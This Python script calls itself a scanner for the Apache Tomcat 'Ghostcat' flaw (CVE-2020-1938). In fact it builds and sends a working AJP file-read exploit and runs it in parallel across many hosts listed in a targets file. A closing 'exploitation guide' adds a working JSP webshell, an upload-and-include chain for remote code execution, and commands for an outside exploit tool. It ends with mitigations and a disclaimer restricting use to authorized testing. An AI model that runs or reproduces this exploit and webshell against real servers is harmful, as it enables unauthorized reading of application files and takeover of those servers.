#!/usr/bin/env python3
"""
👻 Ghostcat Scanner — CVE-2020-1938
Apache Tomcat AJP Local File Inclusion / Remote Code Execution Detector

Standalone Python tool for detecting CVE-2020-1938 (Ghostcat) vulnerability
on Apache Tomcat servers via the AJP (Apache JServ Protocol) connector on port 8009.

HOW TO EXPLOIT CVE-2020-1938 (Ghostcat):

1. FILE READ (Local File Inclusion):
   - Send crafted AJP Forward Request with javax.servlet.include.* attributes
   - Read any file from webapp directory (e.g., /WEB-INF/web.xml, /WEB-INF/classes/)
   - No authentication required

2. REMOTE CODE EXECUTION (RCE) - requires EXTRA CONDITIONS:
   - Target must have FILE UPLOAD feature (avatar, document, etc.)
   - Uploaded files stored within webapp directory
   - Upload a JSP webshell (can be .txt, .jpg - extension doesn't matter)
   - Use Ghostcat to INCLUDE the uploaded file as JSP
   - Tomcat compiles and executes the JSP → RCE achieved!

   Steps:
   a) Upload malicious JSP content disguised as any file type
   b) Use Ghostcat to include that file via AJP
   c) Tomcat executes it as JSP
   d) Execute commands via the webshell

AUTHORIZED SECURITY TESTING ONLY. Obtain proper authorization before scanning.
"""

import socket
import struct
import sys
import argparse
import threading
import time
from datetime import datetime
from typing import List, Dict, Tuple, Optional
from dataclasses import dataclass, field
from queue import Queue
import json
import os

# ─── Colors (Catppuccin Mocha) ───
CLR_RESET = "\x1b[0m"
CLR_BOLD = "\x1b[1m"
CLR_DIM = "\x1b[2m"
CLR_RED = "\x1b[38;2;243;139;168m"
CLR_GREEN = "\x1b[38;2;166;227;161m"
CLR_YELLOW = "\x1b[38;2;249;226;175m"
CLR_BLUE = "\x1b[38;2;137;180;250m"
CLR_MAUVE = "\x1b[38;2;203;166;247m"
CLR_PEACH = "\x1b[38;2;250;179;135m"
CLR_SKY = "\x1b[38;2;137;220;235m"
CLR_TEAL = "\x1b[38;2;148;226;213m"
CLR_PINK = "\x1b[38;2;245;194;231m"
CLR_TEXT = "\x1b[38;2;205;214;244m"
CLR_OVERLAY = "\x1b[38;2;127;132;156m"
CLR_SURFACE0 = "\x1b[38;2;49;50;68m"
CLR_SURFACE1 = "\x1b[38;2;69;71;90m"

# ─── AJP Protocol Constants ───
AJP_HEADER_SERVER_TO_CONTAINER = 0x1234
AJP_HEADER_CONTAINER_TO_SERVER = 0x4142

AJP_PREFIX_FORWARD_REQUEST = 0x02
AJP_PREFIX_SEND_HEADERS = 0x04
AJP_PREFIX_SEND_BODY_CHUNK = 0x03
AJP_PREFIX_END_RESPONSE = 0x05
AJP_PREFIX_GET_BODY_CHUNK = 0x06

AJP_METHOD_GET = 2
AJP_METHOD_POST = 4

# Attribute codes
AJP_ATTR_CONTEXT = 1
AJP_ATTR_SERVLET_PATH = 2
AJP_ATTR_REMOTE_USER = 3
AJP_ATTR_AUTH_TYPE = 4
AJP_ATTR_QUERY_STRING = 5
AJP_ATTR_ROUTE = 6
AJP_ATTR_SSL_CERT = 7
AJP_ATTR_SSL_CIPHER = 8
AJP_ATTR_SSL_SESSION = 9
AJP_ATTR_REQ_ATTRIBUTE = 10
AJP_ATTR_SSL_KEY_SIZE = 11
AJP_ATTR_SECRET = 12
AJP_ATTR_STORED_METHOD = 13
AJP_ATTR_END = 0xFF


@dataclass
class ScanResult:
    """Result of a single target scan"""
    host: str
    port: int
    vulnerable: bool = False
    status_code: int = 0
    status_msg: str = ""
    server_header: str = ""
    body_length: int = 0
    body_preview: str = ""
    error: str = ""
    took_ms: int = 0
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())


@dataclass
class VulnTarget:
    """Vulnerable target information for saving to file"""
    host: str
    port: int
    filepath: str = "/WEB-INF/web.xml"
    body_length: int = 0
    response_time_ms: int = 0
    found_at: str = field(default_factory=lambda: datetime.now().isoformat())


# ─── AJP Protocol Helpers ───

def ajp_string(s: str) -> bytes:
    """Encode a string for AJP protocol: 2-byte length + data + null terminator"""
    if not s:
        return b'\xff\xff'  # null string marker
    encoded = s.encode('utf-8')
    buf = struct.pack('>H', len(encoded)) + encoded + b'\x00'
    return buf


# ─── AJP Packet Builder ───

def build_forward_request(target_file: str) -> bytes:
    """
    Build AJP Forward Request packet for Ghostcat exploitation.
    
    The packet sets three javax.servlet.include.* attributes to trigger file inclusion:
    - javax.servlet.include.request_uri = "/"
    - javax.servlet.include.path_info = target file path
    - javax.servlet.include.servlet_path = "/"
    
    This tells Tomcat to include and return the specified file.
    """
    body = bytearray()
    
    # Prefix code (Forward Request = 0x02)
    body.append(AJP_PREFIX_FORWARD_REQUEST)
    
    # Method (GET = 2)
    body.append(AJP_METHOD_GET)
    
    # Protocol
    body.extend(ajp_string("HTTP/1.1"))
    
    # Request URI
    body.extend(ajp_string("/"))
    
    # Remote addr
    body.extend(ajp_string("127.0.0.1"))
    
    # Remote host
    body.extend(ajp_string("localhost"))
    
    # Server name
    body.extend(ajp_string("localhost"))
    
    # Server port
    body.extend(struct.pack('>H', 80))
    
    # Is SSL
    body.append(0x00)
    
    # Number of headers (0)
    body.extend(struct.pack('>H', 0))
    
    # ─── Attributes — the core of Ghostcat exploit ───
    
    # javax.servlet.include.request_uri = "/"
    body.append(AJP_ATTR_REQ_ATTRIBUTE)
    body.extend(ajp_string("javax.servlet.include.request_uri"))
    body.extend(ajp_string("/"))
    
    # javax.servlet.include.path_info = target file path
    # This is the KEY - tells Tomcat which file to include
    body.append(AJP_ATTR_REQ_ATTRIBUTE)
    body.extend(ajp_string("javax.servlet.include.path_info"))
    body.extend(ajp_string(target_file))
    
    # javax.servlet.include.servlet_path = "/"
    body.append(AJP_ATTR_REQ_ATTRIBUTE)
    body.extend(ajp_string("javax.servlet.include.servlet_path"))
    body.extend(ajp_string("/"))
    
    # End of attributes
    body.append(AJP_ATTR_END)
    
    # Build final packet: magic (2) + length (2) + body
    packet = struct.pack('>HH', AJP_HEADER_SERVER_TO_CONTAINER, len(body)) + bytes(body)
    
    return packet


# ─── AJP Response Parser ───

COMMON_HEADER_CODES = {
    0xA001: "Content-Type",
    0xA002: "Content-Language",
    0xA003: "Content-Length",
    0xA004: "Date",
    0xA005: "Last-Modified",
    0xA006: "Location",
    0xA007: "Set-Cookie",
    0xA008: "Set-Cookie2",
    0xA009: "Servlet-Engine",
    0xA00A: "Status",
    0xA00B: "WWW-Authenticate",
}


def read_ajp_string(data: bytes, offset: int) -> Tuple[str, int]:
    """Read an AJP-encoded string from data at offset, return (string, new_offset)"""
    if offset + 2 > len(data):
        return "", offset
    str_len = struct.unpack('>H', data[offset:offset+2])[0]
    offset += 2
    if str_len == 0xFFFF:
        return "", offset  # null string
    if str_len == 0 or offset + str_len + 1 > len(data):
        return "", offset
    s = data[offset:offset+str_len].decode('utf-8', errors='replace')
    offset += str_len + 1  # skip null terminator
    return s, offset


def parse_ajp_response(data: bytes) -> Optional[Dict]:
    """Parse AJP response data, return parsed response dict or None"""
    result = {
        'status_code': 0,
        'status_msg': '',
        'headers': {},
        'body_chunks': [],
        'server_header': '',
        'end_received': False,
    }
    
    offset = 0
    while offset < len(data):
        # Need at least 4 bytes for header (magic + length)
        if offset + 4 > len(data):
            break
        
        magic = struct.unpack('>H', data[offset:offset+2])[0]
        if magic != AJP_HEADER_CONTAINER_TO_SERVER:
            break
        
        data_len = struct.unpack('>H', data[offset+2:offset+4])[0]
        if data_len == 0 or offset + 4 + data_len > len(data):
            break
        
        # Extract the sub-packet body
        packet_body = data[offset+4:offset+4+data_len]
        prefix_byte = packet_body[0]
        
        if prefix_byte == AJP_PREFIX_SEND_HEADERS:
            # Parse send headers
            r = packet_body[1:]
            if len(r) >= 2:
                result['status_code'] = struct.unpack('>H', r[0:2])[0]
                r = r[2:]
                status_msg, r = read_ajp_string(r, 0)
                result['status_msg'] = status_msg
                
                if len(r) >= 2:
                    num_headers = struct.unpack('>H', r[0:2])[0]
                    r = r[2:]
                    for _ in range(num_headers):
                        if len(r) < 2:
                            break
                        code = struct.unpack('>H', r[0:2])[0]
                        r = r[2:]
                        
                        header_name = ""
                        if 0xA001 <= code <= 0xA00B:
                            header_name = COMMON_HEADER_CODES.get(code, f"Unknown-{code:04X}")
                        else:
                            name_len = code
                            if name_len > 0 and len(r) >= name_len + 1:
                                header_name = r[:name_len].decode('utf-8', errors='replace')
                                r = r[name_len+1:]  # skip null
                        
                        header_value, r = read_ajp_string(r, 0)
                        result['headers'][header_name.lower()] = header_value
                        
                        if header_name.lower() in ('servlet-engine', 'status'):
                            result['server_header'] = header_value
        
        elif prefix_byte == AJP_PREFIX_SEND_BODY_CHUNK:
            if len(packet_body) >= 3:
                chunk_len = struct.unpack('>H', packet_body[1:3])[0]
                if chunk_len > 0 and 3 + chunk_len <= len(packet_body):
                    chunk = packet_body[3:3+chunk_len].decode('utf-8', errors='replace')
                    result['body_chunks'].append(chunk)
        
        elif prefix_byte == AJP_PREFIX_END_RESPONSE:
            result['end_received'] = True
        
        offset += 4 + data_len
    
    return result


# ─── Detection Logic ───

def detect_ghostcat(host: str, port: int, timeout: float) -> ScanResult:
    """
    Connect to target AJP port and attempt to read /WEB-INF/web.xml
    to determine if CVE-2020-1938 is exploitable.
    
    HOW EXPLOITATION WORKS:
    1. Connect to AJP port (default 8009)
    2. Send crafted Forward Request with file inclusion attributes
    3. If Tomcat is vulnerable, it returns the requested file content
    4. Success = 200 OK with file content (XML from web.xml)
    """
    result = ScanResult(host=host, port=port)
    start_time = time.time()
    
    try:
        # Step 1: TCP connect with timeout
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        
        # Step 2: Build the Ghostcat exploit packet - try to read /WEB-INF/web.xml
        packet = build_forward_request("/WEB-INF/web.xml")
        
        # Step 3: Send the packet
        sock.sendall(packet)
        
        # Step 4: Read full AJP response
        sock.settimeout(timeout)
        response_data = b''
        while True:
            try:
                chunk = sock.recv(8192)
                if not chunk:
                    break
                response_data += chunk
            except socket.timeout:
                break
        
        sock.close()
        result.took_ms = int((time.time() - start_time) * 1000)
        
        if len(response_data) < 5:
            result.error = "No AJP response received (target may not be AJP or is filtered)"
            return result
        
        # Step 5: Parse the AJP response
        resp = parse_ajp_response(response_data)
        if resp is None:
            result.error = "Failed to parse AJP response"
            return result
        
        result.status_code = resp['status_code']
        result.status_msg = resp['status_msg']
        result.server_header = resp['server_header']
        
        # Combine body chunks
        full_body = ''.join(resp['body_chunks'])
        result.body_length = len(full_body)
        
        # Show first 500 chars as preview
        if len(full_body) > 500:
            result.body_preview = full_body[:500] + "..."
        else:
            result.body_preview = full_body
        
        # Step 6: Determine vulnerability
        # If we got a 200 response with actual file content (web.xml contains XML),
        # the target is vulnerable.
        if resp['status_code'] == 200 and result.body_length > 0:
            result.vulnerable = True
        
        # Also flag if we get a 200 with content that looks like XML/config
        xml_indicators = ['<?xml', '<web-app', '<servlet', '<display-name']
        if resp['status_code'] == 200 and any(ind in full_body for ind in xml_indicators):
            result.vulnerable = True
        
    except socket.timeout:
        result.error = "Connection timed out"
        result.took_ms = int(timeout * 1000)
    except ConnectionRefusedError:
        result.error = "Connection refused (port closed)"
        result.took_ms = int((time.time() - start_time) * 1000)
    except OSError as e:
        result.error = f"Connection failed: {e}"
        result.took_ms = int((time.time() - start_time) * 1000)
    except Exception as e:
        result.error = f"Error: {e}"
        result.took_ms = int((time.time() - start_time) * 1000)
    
    return result


def is_port_open(host: str, port: int, timeout: float) -> bool:
    """Quick TCP port check"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((host, port))
        sock.close()
        return result == 0
    except:
        return False


# ─── Banner / UI ───

def print_banner():
    """Print tool banner"""
    print()
    print(f"{CLR_MAUVE}{CLR_BOLD}")
    print("     ╔══════════════════════════════════════════════════╗")
    print("     ║          👻 G H O S T C A T  Scanner           ║")
    print("     ║       CVE-2020-1938  Detection Tool            ║")
    print("     ║        Apache Tomcat AJP LFI/RCE               ║")
    print("     ╚══════════════════════════════════════════════════╝")
    print(f"{CLR_RESET}", end="")
    print(f"  {CLR_TEAL}Huntool-scr{CLR_RESET} {CLR_DIM}•{CLR_RESET} {CLR_SKY}Python{CLR_RESET}")
    print()


def print_usage():
    """Print usage information"""
    print(f"  {CLR_BOLD}Usage:{CLR_RESET}")
    print(f"    {CLR_GREEN}ghostcat.py{CLR_RESET} {CLR_YELLOW}<targets-file>{CLR_RESET} [options]\n")
    print(f"  {CLR_BOLD}Options:{CLR_RESET}")
    print(f"    {CLR_SKY}-p{CLR_RESET}, {CLR_RESET}--port {CLR_YELLOW}<port>{CLR_RESET}     AJP port (default: 8009)")
    print(f"    {CLR_SKY}-t{CLR_RESET}, {CLR_RESET}--timeout {CLR_YELLOW}<secs>{CLR_RESET}   Connection timeout in seconds (default: 5)")
    print(f"    {CLR_SKY}-w{CLR_RESET}, {CLR_RESET}--workers {CLR_YELLOW}<num>{CLR_RESET}     Concurrent workers (default: 10)")
    print(f"    {CLR_SKY}-o{CLR_RESET}, {CLR_RESET}--output {CLR_YELLOW}<file>{CLR_RESET}     Output results to file")
    print(f"    {CLR_SKY}-v{CLR_RESET}, {CLR_RESET}--verbose            Show full response body")
    print(f"    {CLR_SKY}-j{CLR_RESET}, {CLR_RESET}--json {CLR_YELLOW}<file>{CLR_RESET}     Save vulnerable targets as JSON")
    print(f"    {CLR_SKY}-f{CLR_RESET}, {CLR_RESET}--vuln-file {CLR_YELLOW}<file>{CLR_RESET}   Save only vulnerable targets to text file")
    print(f"    {CLR_SKY}-h{CLR_RESET}, {CLR_RESET}--help               Show usage\n")
    print(f"  {CLR_BOLD}Targets File:{CLR_RESET}")
    print(f"    One host per line (IP or hostname)")
    print(f"    {CLR_DIM}Example:{CLR_RESET}")
    print(f"    {CLR_OVERLAY}  192.168.1.10{CLR_RESET}")
    print(f"    {CLR_OVERLAY}  192.168.1.20{CLR_RESET}")
    print(f"    {CLR_OVERLAY}  tomcat.example.com{CLR_RESET}\n")
    print(f"  {CLR_BOLD}Examples:{CLR_RESET}")
    print(f"    {CLR_GREEN}python3 ghostcat.py{CLR_RESET} targets.txt")
    print(f"    {CLR_GREEN}python3 ghostcat.py{CLR_RESET} targets.txt {CLR_SKY}-p 8009 -w 20{CLR_RESET}")
    print(f"    {CLR_GREEN}python3 ghostcat.py{CLR_RESET} targets.txt {CLR_SKY}-o results.txt -v{CLR_RESET}")
    print(f"    {CLR_GREEN}python3 ghostcat.py{CLR_RESET} targets.txt {CLR_SKY}-f vulns.txt{CLR_RESET}")
    print(f"    {CLR_GREEN}python3 ghostcat.py{CLR_RESET} targets.txt {CLR_SKY}-j vulns.json{CLR_RESET}\n")


def print_result(result: ScanResult, verbose: bool = False):
    """Print formatted scan result"""
    addr = f"{result.host}:{result.port}"
    
    if result.error:
        print(f"  {CLR_RED}✗{CLR_RESET} {addr:<35} {CLR_DIM}{result.error}{CLR_RESET} {CLR_DIM}({result.took_ms}ms){CLR_RESET}")
        return
    
    if result.vulnerable:
        print(f"  {CLR_RED}{CLR_BOLD}⚠ VULNERABLE{CLR_RESET} {addr:<25} {CLR_PEACH}Tomcat AJP {result.port} OPEN{CLR_RESET}")
        print(f"    {CLR_SURFACE1}├──{CLR_RESET} Status:  {CLR_RED}{result.status_code} {result.status_msg}{CLR_RESET}")
        if result.server_header:
            print(f"    {CLR_SURFACE1}├──{CLR_RESET} Server:  {CLR_SKY}{result.server_header}{CLR_RESET}")
        print(f"    {CLR_SURFACE1}├──{CLR_RESET} Body:    {CLR_YELLOW}{result.body_length} bytes{CLR_RESET}")
        print(f"    {CLR_SURFACE1}└──{CLR_RESET} Took:    {CLR_DIM}{result.took_ms}ms{CLR_RESET}")
        if verbose and result.body_preview:
            print(f"    {CLR_OVERLAY}── Response Body ──{CLR_RESET}")
            for line in result.body_preview.split('\n'):
                print(f"    {CLR_SURFACE1}│{CLR_RESET} {line}")
            print(f"    {CLR_OVERLAY}──────────────────{CLR_RESET}")
    else:
        # Port open but not vulnerable
        print(f"  {CLR_GREEN}●{CLR_RESET} {addr:<35} {CLR_TEAL}Port open, not vulnerable{CLR_RESET} {CLR_DIM}({result.status_code}, {result.took_ms}ms){CLR_RESET}")


def save_vuln_targets_to_file(vuln_targets: List[VulnTarget], output_file: str):
    """Save vulnerable targets to a text file"""
    with open(output_file, 'w', encoding='utf-8') as f:
        f.write(f"# Ghostcat Vulnerable Targets Report\n")
        f.write(f"# CVE-2020-1938\n")
        f.write(f"# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"# Total Vulnerable: {len(vuln_targets)}\n")
        f.write(f"#{'='*70}\n\n")
        
        for i, target in enumerate(vuln_targets, 1):
            f.write(f"{i}. {target.host}:{target.port}\n")
            f.write(f"   File: {target.filepath}\n")
            f.write(f"   Response Size: {target.body_length} bytes\n")
            f.write(f"   Response Time: {target.response_time_ms}ms\n")
            f.write(f"   Found At: {target.found_at}\n")
            f.write(f"{'-'*50}\n")
        
        f.write(f"\n{'='*70}\n")
        f.write(f"SUMMARY: {len(vuln_targets)} vulnerable target(s) found\n")
    
    print(f"\n  {CLR_GREEN}✓{CLR_RESET} Vulnerable targets saved to: {CLR_YELLOW}{output_file}{CLR_RESET}")


def save_vuln_targets_to_json(vuln_targets: List[VulnTarget], output_file: str):
    """Save vulnerable targets to a JSON file"""
    data = {
        "scan_info": {
            "vulnerability": "CVE-2020-1938",
            "name": "Ghostcat - Apache Tomcat AJP File Read/Inclusion",
            "cvss_score": 9.8,
            "generated_at": datetime.now().isoformat(),
        },
        "summary": {
            "total_vulnerable": len(vuln_targets),
        },
        "targets": [
            {
                "host": t.host,
                "port": t.port,
                "filepath": t.filepath,
                "body_length": t.body_length,
                "response_time_ms": t.response_time_ms,
                "found_at": t.found_at,
            }
            for t in vuln_targets
        ]
    }
    
    with open(output_file, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2)
    
    print(f"\n  {CLR_GREEN}✓{CLR_RESET} JSON report saved to: {CLR_YELLOW}{output_file}{CLR_RESET}")


# ─── Worker Pool ───

def worker(target_queue: Queue, result_queue: Queue, vuln_queue: Queue, 
           port: int, timeout: float, stop_event: threading.Event):
    """Worker thread that scans targets"""
    while not stop_event.is_set():
        try:
            host = target_queue.get(timeout=0.5)
        except:
            continue
        
        if host is None:
            target_queue.task_done()
            break
        
        # Quick port check first
        if not is_port_open(host, port, timeout):
            result_queue.put(ScanResult(
                host=host, port=port,
                error="port closed or host unreachable",
                took_ms=int(timeout * 1000)
            ))
            target_queue.task_done()
            continue
        
        # Run full detection
        result = detect_ghostcat(host, port, timeout)
        result_queue.put(result)
        
        # If vulnerable, send to vuln queue
        if result.vulnerable:
            vuln_queue.put(VulnTarget(
                host=result.host,
                port=result.port,
                filepath="/WEB-INF/web.xml",
                body_length=result.body_length,
                response_time_ms=result.took_ms,
            ))
        
        target_queue.task_done()


# ─── Main ───

def main():
    parser = argparse.ArgumentParser(
        description="👻 Ghostcat Scanner — CVE-2020-1938 Detection Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 ghostcat.py targets.txt
  python3 ghostcat.py targets.txt -p 8009 -w 20
  python3 ghostcat.py targets.txt -o results.txt -v
  python3 ghostcat.py targets.txt -f vulns.txt
  python3 ghostcat.py targets.txt -j vulns.json
        """
    )
    parser.add_argument("targets_file", help="File with targets (one per line)")
    parser.add_argument("-p", "--port", type=int, default=8009, help="AJP port (default: 8009)")
    parser.add_argument("-t", "--timeout", type=float, default=5.0, help="Timeout in seconds (default: 5)")
    parser.add_argument("-w", "--workers", type=int, default=10, help="Concurrent workers (default: 10)")
    parser.add_argument("-o", "--output", help="Save all results to file")
    parser.add_argument("-v", "--verbose", action="store_true", help="Show full response body")
    parser.add_argument("-j", "--json", dest="json_file", help="Save vulnerable targets as JSON")
    parser.add_argument("-f", "--vuln-file", dest="vuln_file", help="Save only vulnerable targets to text file")
    parser.add_argument("--csv", dest="csv_file", help="Save all results as CSV")
    
    args = parser.parse_args()
    
    print_banner()
    
    # Read targets from file
    if not os.path.exists(args.targets_file):
        print(f"  {CLR_RED}Error:{CLR_RESET} Targets file not found: {args.targets_file}\n")
        sys.exit(1)
    
    with open(args.targets_file, 'r') as f:
        targets = [
            line.strip() for line in f
            if line.strip() and not line.strip().startswith('#')
        ]
    
    if not targets:
        print(f"  {CLR_RED}Error:{CLR_RESET} No targets found in '{args.targets_file}'\n")
        sys.exit(1)
    
    print(f"  {CLR_SKY}📋 Loaded {len(targets)} target(s){CLR_RESET} from {CLR_YELLOW}{args.targets_file}{CLR_RESET}")
    print(f"  {CLR_TEAL}🎯 Port:{CLR_RESET} {args.port}  {CLR_TEAL}⏱ Timeout:{CLR_RESET} {args.timeout}s  {CLR_TEAL}⚡ Workers:{CLR_RESET} {args.workers}")
    print()
    print(f"  {CLR_SURFACE1}{'─'*60}{CLR_RESET}")
    print()
    
    # Setup queues
    target_queue = Queue()
    result_queue = Queue()
    vuln_queue = Queue()
    stop_event = threading.Event()
    
    # Start workers
    threads = []
    for _ in range(args.workers):
        t = threading.Thread(
            target=worker,
            args=(target_queue, result_queue, vuln_queue, args.port, args.timeout, stop_event),
            daemon=True
        )
        t.start()
        threads.append(t)
    
    # Feed targets to queue
    for target in targets:
        target_queue.put(target)
    
    # Wait for all targets to be processed
    target_queue.join()
    
    # Signal workers to stop
    stop_event.set()
    for t in threads:
        t.join(timeout=2)
    
    # Collect results
    results = []
    vuln_targets = []
    while not result_queue.empty():
        try:
            result = result_queue.get_nowait()
            results.append(result)
            if result.vulnerable:
                vuln_targets.append(VulnTarget(
                    host=result.host,
                    port=result.port,
                    filepath="/WEB-INF/web.xml",
                    body_length=result.body_length,
                    response_time_ms=result.took_ms,
                ))
        except:
            break
    
    # Display results
    vuln_count = 0
    open_count = 0
    closed_count = 0
    error_count = 0
    
    for r in results:
        print_result(r, args.verbose)
        if r.error:
            if "port closed" in r.error.lower() or "refused" in r.error.lower():
                closed_count += 1
            else:
                error_count += 1
        elif r.vulnerable:
            vuln_count += 1
        else:
            open_count += 1
    
    # ─── Summary ───
    print()
    print(f"  {CLR_SURFACE1}{'─'*60}{CLR_RESET}")
    print(f"  {CLR_BOLD}📊 Scan Summary:{CLR_RESET}")
    print(f"    {CLR_RED}🔴 Vulnerable:{CLR_RESET}      {vuln_count}")
    print(f"    {CLR_GREEN}🟢 Open (safe):{CLR_RESET}     {open_count}")
    print(f"    {CLR_DIM}⚫ Closed/Filtered:{CLR_RESET} {closed_count}")
    if error_count > 0:
        print(f"    {CLR_YELLOW}🟡 Errors:{CLR_RESET}          {error_count}")
    
    # ─── Vulnerable Targets Summary ───
    if vuln_targets:
        print(f"\n  {CLR_RED}📁 Vulnerable Targets Found: {len(vuln_targets)}{CLR_RESET}")
        print(f"  {CLR_SURFACE1}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{CLR_RESET}")
        print(f"  {CLR_BOLD}{'Target':<35} {'Status'}{CLR_RESET}")
        for v in vuln_targets:
            key = f"{v.host}:{v.port}"
            print(f"  {CLR_RED}⚠{CLR_RESET} {key:<33} {CLR_RESET}VULNERABLE (AJP {v.port}, {v.body_length} bytes){CLR_RESET}")
        print()
    
    # ─── Save vulnerable targets to file ───
    if args.vuln_file:
        save_vuln_targets_to_file(vuln_targets, args.vuln_file)
    
    # ─── Save vulnerable targets to JSON ───
    if args.json_file:
        save_vuln_targets_to_json(vuln_targets, args.json_file)
    
    # ─── Save all results to output file ───
    if args.output:
        with open(args.output, 'w', encoding='utf-8') as f:
            f.write(f"# Ghostcat Scan Results\n")
            f.write(f"# CVE-2020-1938\n")
            f.write(f"# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"# Total Targets: {len(targets)}\n")
            f.write(f"# Vulnerable: {vuln_count}\n")
            f.write(f"#{'='*70}\n\n")
            
            for r in results:
                status = "CLOSED"
                if r.error and "port closed" not in r.error.lower():
                    status = "ERROR"
                elif not r.vulnerable and not r.error:
                    status = "OPEN_SAFE"
                elif r.vulnerable:
                    status = "VULNERABLE"
                
                error_str = r.error.replace('\n', ' ') if r.error else ""
                f.write(f"{r.host}:{r.port}\t{status}\t{r.body_length}\t{r.took_ms}ms\t{error_str}\n")
        
        print(f"\n  {CLR_GREEN}✓{CLR_RESET} All results saved to: {CLR_YELLOW}{args.output}{CLR_RESET}")
    
    # ─── Save as CSV ───
    if args.csv_file:
        with open(args.csv_file, 'w', encoding='utf-8') as f:
            f.write("host,port,status,status_code,body_length,response_time_ms,error\n")
            for r in results:
                error_str = r.error.replace(',', ';').replace('\n', ' ') if r.error else ""
                status = "CLOSED"
                if r.error and "port closed" not in r.error.lower():
                    status = "ERROR"
                elif not r.vulnerable and not r.error:
                    status = "OPEN_SAFE"
                elif r.vulnerable:
                    status = "VULNERABLE"
                
                f.write(f"{r.host},{r.port},{status},{r.status_code},{r.body_length},{r.took_ms},{error_str}\n")
        
        print(f"\n  {CLR_GREEN}✓{CLR_RESET} CSV report saved to: {CLR_YELLOW}{args.csv_file}{CLR_RESET}")
    
    print()


# ─── Exploit Examples Documentation ───
"""

╔══════════════════════════════════════════════════════════════════════════╗
║                    CVE-2020-1938 EXPLOITATION GUIDE                       ║
╚══════════════════════════════════════════════════════════════════════════╝

## WHAT IS GHOSTCAT?

CVE-2020-1938 (Ghostcat) is a file inclusion vulnerability in Apache Tomcat's
AJP connector. It affects Tomcat versions:
- 9.0.0.M1 to 9.0.30  → Fixed in 9.0.31
- 8.5.0 to 8.5.50     → Fixed in 8.5.51  
- 7.0.0 to 7.0.99     → Fixed in 7.0.100
- Tomcat 6 (unpatched, EOL)

## HOW THE EXPLOIT WORKS

### Attack Vector 1: File Read (Local File Inclusion)
The AJP protocol trusts requests more than HTTP. By sending crafted AJP packets
with javax.servlet.include.* attributes, an attacker can:

1. Read any file from the webapp directory
2. Access sensitive files like:
   - /WEB-INF/web.xml (application configuration)
   - /WEB-INF/classes/ (Java classes)
   - /WEB-INF/lib/ (JAR files)
   - /META-INF/ (metadata)

### Attack Vector 2: Remote Code Execution (RCE)
RCE is POSSIBLE but requires ADDITIONAL conditions:

1. Target application has FILE UPLOAD feature
2. Uploaded files are stored within webapp directory
3. Attacker can reach AJP port directly (port 8009)

EXPLOIT CHAIN:
1. Upload a file containing JSP code (e.g., shell.jsp disguised as .txt)
2. Use Ghostcat to INCLUDE the uploaded file via AJP
3. Tomcat processes the file as JSP → code execution!

## EXPLOITATION STEPS

### Step 1: Check if AJP port is open
```bash
nmap -p 8009 <target>
# or
python3 ghostcat.py targets.txt
```

### Step 2: Read sensitive files (always possible if vulnerable)
```python
# Using this tool - already built in
python3 ghostcat.py targets.txt
# The tool reads /WEB-INF/web.xml by default
```

### Step 3: RCE - Upload and execute JSP shell

If the target has a file upload feature:

a) Create a JSP webshell:
```jsp
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(
        new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) {
        out.println(line);
    }
}
%>
```

b) Upload it via the application's upload feature (as .txt, .jpg, etc.)

c) Use Ghostcat to include and execute it:
The tool's current implementation reads files. To achieve RCE, you would
modify the path_info attribute to point to the uploaded file and set the
request_uri to end with .jsp so Tomcat compiles it.

### Alternative: Using existing tools
```bash
# Using ajpShooter.py (available on GitHub)
pip install requests
git clone https://github.com/00theway/Ghostcat-CNVD-2020-10487
python3 ajpShooter.py http://target:8080/ 8009 /WEB-INF/web.xml read

# For RCE with uploaded file
python3 ajpShooter.py http://target:8080/ 8009 /uploads/shell.txt eval
```

## MITIGATION

1. **Disable AJP** - Comment out AJP connector in $CATALINA_HOME/conf/server.xml
2. **Set secret** - Add `secret="your-secret"` to AJP connector
3. **Upgrade** - Use Tomcat 9.0.31+, 8.5.51+, or 7.0.100+
4. **Firewall** - Block port 8009 from untrusted networks
5. **Bind to localhost** - Set `address="127.0.0.1"` on AJP connector

## LEGAL DISCLAIMER

This tool is for AUTHORIZED SECURITY TESTING ONLY.
Unauthorized access to computer systems is illegal.
Always obtain proper written authorization before scanning.
"""
if __name__ == "__main__":
    main()
